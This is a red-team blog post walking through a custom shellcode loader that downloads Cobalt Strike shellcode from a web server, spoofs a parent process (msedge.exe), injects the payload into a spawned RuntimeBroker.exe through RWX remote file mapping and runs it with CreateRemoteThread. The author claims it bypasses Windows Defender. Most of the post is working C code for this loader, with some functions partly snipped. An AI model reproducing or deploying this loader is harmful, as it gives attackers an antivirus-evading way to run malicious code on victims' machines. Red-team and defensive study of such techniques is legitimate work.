---
layout: post
category: blog
---
# Adopted Maps: The PPID Spoofing Conundrum

hey its gerbsec back again with more heat. i've gotten into maldev as part of my red team journey that i have been documenting. specifically different techinques i can make my beacon hide better. for starters, we need to write our own loaders! this is where gerbload (name is in the works) comes in handy!

### what is gerbload?

[gerbload](https://github.com/gerbsec/MalDev/blob/main/README.md) is a shellcode loader i wrote that functions as a orphanage! essentially it'll pull your shellcode from a webserver, find a suitable parent for your orphan child process. match them up and inject your shellcode! this will spoof the current directory, the arguments, the parent and the process where our shellcode will reside! as of right now this bypasses defender (ok i get it, not a big deal). i have not tested against edr.

### lets walk through the code

#### download payload

the first part of the code involves downloading the payload from a url and storing. in this case i'm using cobaltstrike shellcode. i should add that i have artifact kit, process inject kit and sleep mask kit all enabled and customized ahead of time. (maybe i'll do some blog posts on those later?)

```c
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
<SNIP>
}
```

this takes 3 arguments: the URL, a Size variable to store the size of the payload and a PBYTE variable to store the actual bytes of the shellcode. 

the usage utilizes wininet.h, its quite a simple request with not much opsec being considered here.
#### spoofing the ppid

now that we have the payload stored in memory, let's make room for it. first of all we need a parent process. we can use a lot of different processes but for our case i've used `msedge.exe` mainly because the odds of it running on a windows 10/11 machine is almost 100% nowadays. 

P.S. this only works on normal priv processes.

from there we'll utilize GetRemoteProcessHandle function that under the hood uses CreateToolhelp32Snapshot:
```c
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
<SNIP>
	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
	<SNIP>
	 while (Process32Next(hSnapShot, &Proc));
```

we'll loop over the processes until we find msedge, from there we'll utilize it to create the process.

first we'll create the target process path:

```c
	// making the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// making the `lpCurrentDirectory` parameter in CreateProcessA
	sprintf(CurrentDir, "%s\\System32\\", WnDr);
```

from there we can specifiy the attributes to the process we're creating:
```c
	// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// calling InitializeProcThreadAttributeList again passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
	// created using `UpdateProcThreadAttribute` - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;
```

finally we'll goahead and use CreateProcessA to create the process:
```c
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		CurrentDir,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}
```

at this point we should have a process that (in our case) is "Runtimebroker.exe -embedding" running under msedge.exe (lol). We successfully found a parent for our orphan! 

#### injecting the payload

now that we have a process running, we can inject our shellcode. we can do this many ways. if we wanted to use an early bird technique we just have to put the process we created in a suspended state. this could be done many ways, one way is to put it as a DEBUG_PROCESS state and the debugger is our current process. a slightly more simple and more opsec friendly way is to inject without the use of private memory. we'll do this using remote mapping injection. 

```c
BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL		bSTATE				= TRUE;
	HANDLE		hFile				= NULL;
	PVOID		pMapLocalAddress	= NULL,
				pMapRemoteAddress	= NULL;


	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE are the permissions of the file (payload) - 
	// since we only need to write (copy) the payload to it
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// maps the payload to a new remote buffer (in the target process)
	// it is possible here to change the memory permissions to `RWX`
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}
```

here we create a filemapping with rwx, then we'll map the view of the payload to the memory with file_map_write permissions. Finally we'll use MapViewOfFile2 to maps the payload on the remote buffer and change its permissions to rwx. 

#### executing the shellcode

we're practically done now, all is left is to execute the shellcode in the process we have injected it, we can do this in many ways but for simplicity we can do this with CreateRemoteThread with the process and address:

```
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread == NULL)
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());

	return 0;
```

annnnndd we get our beacon!

![](assets/images/2024-07-31-adopted-maps-image-1.png)

as we also see the process its running as is RuntimeBroker, if we check process hacker we can see the parent process and current directory are set:

![](assets/images/2024-07-31-adopted-maps-image-2.png)

Finally the mandatory defender screenshot:

![](assets/images/2024-07-31-adopted-maps-image-3.png)

thats all i had today. i'm sure theres tons of typos and such, so i'll be sure to go back and edit this as i reread it....

best,
gerbsec